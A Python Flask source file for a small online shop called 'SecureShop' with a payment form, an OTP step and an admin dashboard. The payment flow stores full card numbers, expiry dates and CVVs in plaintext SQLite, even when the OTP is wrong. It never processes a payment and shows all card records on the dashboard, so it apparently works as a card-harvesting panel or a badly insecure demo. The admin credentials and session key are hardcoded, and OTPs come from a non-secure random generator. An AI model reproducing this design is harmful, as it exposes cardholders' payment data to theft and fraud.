from flask import Flask, render_template, request, redirect, session
import sqlite3
import random
import smtplib
from email.mime.text import MIMEText
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"

# -------------------------------------------
# Produits du shop
products = [
    {
        "name": "Smart Watch",
        "price": 120,
        "image": "https://images.unsplash.com/photo-1516574187841-cb9cc2ca948b"
    },
    {
        "name": "Laptop",
        "price": 700,
        "image": "https://images.unsplash.com/photo-1517336714731-489689fd1ca8"
    },
    {
        "name": "Desktop Computer",
        "price": 900,
        "image": "https://images.unsplash.com/photo-1587202372775-e229f172b9d7"
    },
    {
        "name": "Smartphone",
        "price": 400,
        "image": "https://images.unsplash.com/photo-1511707171634-5f897ff02aa9"
    },
]

# -------------------------------------------
# Base de données
def init_db():

    conn = sqlite3.connect(
        "database.db",
        check_same_thread=False
    )

    cursor = conn.cursor()

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS transactions(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            card TEXT,
            exp TEXT,
            cvv TEXT,
            amount REAL,
            status TEXT
        )
    """)

    conn.commit()
    conn.close()

init_db()

# -------------------------------------------
# OTP + EMAIL
def generate_otp(email):

    otp = str(random.randint(100000, 999999))

    print("=================================")
    print("OTP DU CLIENT :", otp)
    print("=================================")

    sender = os.getenv("EMAIL_USER")
    password = os.getenv("EMAIL_PASS")

    # Vérification Render
    if not sender or not password:
        print("VARIABLES EMAIL MANQUANTES")
        return otp

    msg = MIMEText(f"Votre code OTP est : {otp}")
    msg["Subject"] = "Code OTP SecureShop"
    msg["From"] = sender
    msg["To"] = email

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()

        server.login(sender, password)

        server.sendmail(sender, email, msg.as_string())

        server.quit()

        print("EMAIL OTP ENVOYÉ")

    except Exception as e:
        print("ERREUR EMAIL :", e)

    return otp

# -------------------------------------------
# ROUTES
@app.route("/")
def index():
    return render_template("index.html")

# -------------------------------------------
@app.route("/shop")
def shop():
    return render_template("shop.html", products=products)

# -------------------------------------------
@app.route("/payment", methods=["GET", "POST"])
def payment():

    product_prices = {
        "Smart Watch": 120,
        "Laptop": 700,
        "Desktop Computer": 900,
        "Smartphone": 400
    }

    # -----------------------------------
    # GET = choix produit
    if request.method == "GET":

        product = request.args.get("product")

        if not product:
            return redirect("/shop")

        if product not in product_prices:
            return "Produit invalide"

        session["product"] = product
        session["amount"] = product_prices[product]

        return render_template(
            "payment.html",
            product=product,
            amount=product_prices[product]
        )

    # -----------------------------------
    # POST = formulaire paiement
    if request.method == "POST":

        session["name"] = request.form["name"]
        session["email"] = request.form["email"]
        session["card"] = request.form["card"]
        session["exp"] = request.form["exp"]
        session["cvv"] = request.form["cvv"]

        otp = generate_otp(session["email"])

        session["otp"] = otp

        return redirect("/otp")

# -------------------------------------------
@app.route("/otp", methods=["GET", "POST"])
def otp():

    if request.method == "POST":

        user_otp = request.form["otp"]

        conn = sqlite3.connect(
            "database.db",
            check_same_thread=False
        )

        cursor = conn.cursor()

        # -----------------------------------
        # OTP CORRECT
        if user_otp == session.get("otp"):

            cursor.execute("""
                INSERT INTO transactions
                (name, card, exp, cvv, amount, status)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                session.get("name"),
                session.get("card"),
                session.get("exp"),
                session.get("cvv"),
                session.get("amount"),
                "SUCCESS"
            ))

            conn.commit()
            conn.close()

            print("TRANSACTION SUCCESS SAVED")

            return redirect("/success")

        # -----------------------------------
        # OTP INCORRECT
        else:

            cursor.execute("""
                INSERT INTO transactions
                (name, card, exp, cvv, amount, status)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                session.get("name"),
                session.get("card"),
                session.get("exp"),
                session.get("cvv"),
                session.get("amount"),
                "FAILED"
            ))

            conn.commit()
            conn.close()

            print("TRANSACTION FAILED SAVED")

            return "OTP incorrect"

    return render_template("otp.html")

# -------------------------------------------
@app.route("/success")
def success():
    return render_template("success.html")

# -------------------------------------------
@app.route("/admin")
def admin():
    return redirect("/dashboard")

# -------------------------------------------
@app.route("/dashboard")
def dashboard():

    if not session.get("admin"):
        return redirect("/login")

    conn = sqlite3.connect(
        "database.db",
        check_same_thread=False
    )

    cursor = conn.cursor()

    cursor.execute("SELECT * FROM transactions")
    transactions = cursor.fetchall()

    cursor.execute("SELECT COUNT(*) FROM transactions")
    total = cursor.fetchone()[0]

    cursor.execute("SELECT SUM(amount) FROM transactions")
    revenue = cursor.fetchone()[0]

    conn.close()

    return render_template(
        "dashboard.html",
        transactions=transactions,
        total=total,
        revenue=revenue if revenue else 0,
        clients=total
    )

# -------------------------------------------
# LOGIN ADMIN
@app.route("/login", methods=["GET", "POST"])
def login():

    if request.method == "POST":

        username = request.form["username"]
        password = request.form["password"]

        if username == "admin" and password == "admin123":

            session["admin"] = True

            return redirect("/dashboard")

        else:

            return "Accès refusé"

    return render_template("login.html")

# -------------------------------------------
@app.route("/logout")
def logout():

    session.clear()

    return redirect("/login")

# -------------------------------------------
# LANCEMENT APPLICATION
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
